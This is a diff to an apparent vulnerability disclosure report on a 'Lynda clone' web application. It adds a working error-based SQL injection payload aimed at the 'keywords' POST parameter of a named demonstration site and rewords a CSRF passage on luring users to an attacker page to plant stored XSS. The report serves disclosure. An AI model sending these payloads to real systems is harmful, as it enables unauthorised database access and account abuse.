@@ -10,8 +10,8 @@ For example:
 ```
 http://lynda-clone.demonstration.co.in/tutorial/
 
-POST para:
-keywords=123
+POST para and poc:
+keywords=123' AND (SELECT 3835 FROM(SELECT COUNT(*),CONCAT(0x7171706b71,(SELECT (ELT(3835=3835,1))),0x7171706271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'sYtx' LIKE 'sYtx
 ```
 
 ![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/FS-Lynda-Clone/sqli.png)
@@ -47,7 +47,8 @@ By the way , these xss vulnerabilitys need to be combined with csrf attack.
 
 #### CSRF
 There is no csrf protection here.
-For example , with the aforementioned stored-xss , we can add a evil content to the user panel:
+For example , with the aforementioned stored-xss , we can cheat the user to visit an evil page on our site。
+Then the user will add a evil content to his user panel, and know nothing about the attack.
 
 ```
 <html>
